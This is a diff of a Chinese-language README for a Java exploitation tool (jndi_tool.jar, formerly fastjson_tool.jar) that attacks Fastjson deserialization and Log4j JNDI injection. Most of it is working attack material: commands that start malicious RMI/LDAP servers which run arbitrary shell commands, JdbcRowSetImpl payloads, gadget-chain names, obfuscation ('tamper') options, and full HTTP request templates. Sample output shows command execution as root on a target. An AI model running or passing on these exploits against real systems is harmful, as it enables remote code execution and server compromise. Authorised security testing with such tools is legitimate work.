@@ -3,19 +3,32 @@
 ```
 声明： 此工具仅用于企业安全人员自查验证自身企业资产的安全风险，或有合法授权的安全测试，请勿用于其他用途，如有，后果自负。
 
-java -jar fastjson_tool.jar
+> java -jar jndi_tool.jar 
 Usage:
-java -cp fastjson_tool.jar fastjson.HRMIServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn" 
-java -cp fastjson_tool.jar fastjson.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn"
+jndi:
+java -cp jndi_tool.jar jndi.HRMIServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn" 
+java -cp jndi_tool.jar jndi.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn"
 
-java -cp fastjson_tool.jar fastjson.HLDAPServer2 127.0.0.1 80 "whoami"
+java -cp jndi_tool.jar jndi.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" el-win/el-linux/groovy
+java -cp jndi_tool.jar jndi.LDAPRefServer 1099 
 
-java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename  tamper=tohex  chunk=on
-java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099  CommonsCollections1 "curl dnslog.cn"
+java -cp jndi_tool.jar jndi.HLDAPServer2 127.0.0.1 80 "whoami"  
 
-java -cp fastjson_tool.jar fastjson.BCELEncode "curl dnslog.wyzxxz.cn"
-java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" el-win/el-linux/groovy
-java -cp fastjson_tool.jar fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/Object\",\"autoCommit\":true}}" 
+fastjson:
+java -cp jndi_tool.jar jndi.fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename tamper=tohex chunk=on
+java -cp jndi_tool.jar jndi.fastjson.BCELEncode "curl dnslog.wyzxxz.cn"
+java -cp jndi_tool.jar jndi.fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/Object\",\"autoCommit\":true}}" 
+
+log4j:
+java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j 127.0.0.1 80 "whoami" http://target 
+java -cp jndi_tool.jar jndi.log4j.HLDAPLog4jAuto 127.0.0.1 1099 url=http://xxx    # 调试功能，可以读system的部分信息
+
+
+
+2021-12-14日志
+1. 新增log4j的一些场景
+2. 优化 jndi.LDAPRefServer，支持gadget/command形式，例如 ldap://xx.xx.xx.xx:1099/CommonsCollections1/curl x.com"
+
 
 
 2021-09-23日志：
@@ -44,14 +57,14 @@ addsize       填充内容
 
 tamper支持多个，但有些不能一起用，多个注意使用的先后顺序，例如 tohex,addcomment
 
-2.fastjson.LDAPRefServerAuto : 新增了一些场景的回显, 选择payload的地方增加了自定义，格式: payload={.........}
+2.jndi.fastjson.LDAPRefServerAuto : 新增了一些场景的回显, 选择payload的地方增加了自定义，格式: payload={.........}
 
 
 
 
 2020-10-30 新增：
-fastjson.LDAPRefServerAuto: 自动找寻反序列可利用的gadget(cb1,cc1-10,spring1-2,groovy1,jdk7u21)。
-java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename
+jndi.fastjson.LDAPRefServerAuto: 自动找寻反序列可利用的gadget(cb1,cc1-10,spring1-2,groovy1,jdk7u21)。
+java -cp jndi_tool.jar jndi.fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename
 
 filename为请求包，需要插入fastjson攻击语句的地方，用__PAYLOAD__代替。示例：
 POST /fastjson_demo HTTP/1.1
@@ -67,7 +80,7 @@ Content-Length: 165
 __PAYLOAD__
 
 
-> java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 8088 file=req chunk=on
+> java -cp jndi_tool.jar jndi.fastjson.LDAPRefServerAuto 127.0.0.1 8088 file=req chunk=on
 [-] Chunked coding ON
 [-] target: https://xx.xx.xx.xx/fastjson_demo
 [-] Payload list:
@@ -92,7 +105,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 
 
-[root@ /]# java -cp fastjson_tool.jar fastjson.HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
+[root@ /]# java -cp jndi_tool.jar jndi.HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 [-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}
 [-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}}
 [-] Opening JRMP listener on 80
@@ -106,7 +119,7 @@ uid=0(root) gid=0(root) groups=0(root)
 [-] send payload done and exit.
 
 
-[root@ /]# java -cp fastjson_tool.jar fastjson.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
+[root@ /]# java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 [-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}
 [-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}}
 [-] LDAP Listening on 0.0.0.0:80
@@ -124,17 +137,17 @@ example:  bash=curl dnslog.wyzxxz.cn
 
 
 1. RMI (need tomcat8)
-java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
+java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
 
 
 2. RMI/LDAP + HTTP
-java -cp fastjson_tool.jar HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
+java -cp jndi_tool.jar jndi.HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 /
-java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
+java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 
 
 3. LDAP2
-java -cp fastjson_tool.jar fastjson.LDAPRefServer2 80 CommonsCollections1 "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar jndi.fastjson.LDAPRefServer 1099
 CommonsBeanutils1  
 CommonsCollections1
 CommonsCollections2
@@ -165,7 +178,7 @@ file   （BASE64编码后的反序列内容文件）
 
 rmi:
 1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
-java -cp fastjson_tool.jar fastjson.EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
+java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
 
 2. 发送请求包
 POST /test HTTP/1.1
@@ -184,7 +197,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 ldap:
 1. 启动LDAP服务，后面写要执行的语句
-java -cp fastjson_tool.jar fastjson.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
+java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 
 2. 发送请求包
 POST /test HTTP/1.1
@@ -205,7 +218,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 ldap:
 1. 启动LDAP服务，后面写要执行的语句
-java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"
+java -cp jndi_tool.jar jndi.LDAPRefServer 1099
 
 2. 发送请求包
 POST /test HTTP/1.1
@@ -216,7 +229,7 @@ Connection: close
 Accept: */*
 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 
 
-{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:1099/Object","autoCommit":true}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:1099/CommonsCollections1/curl x.com","autoCommit":true}
 
 
 3. 查看日志是否执行成功
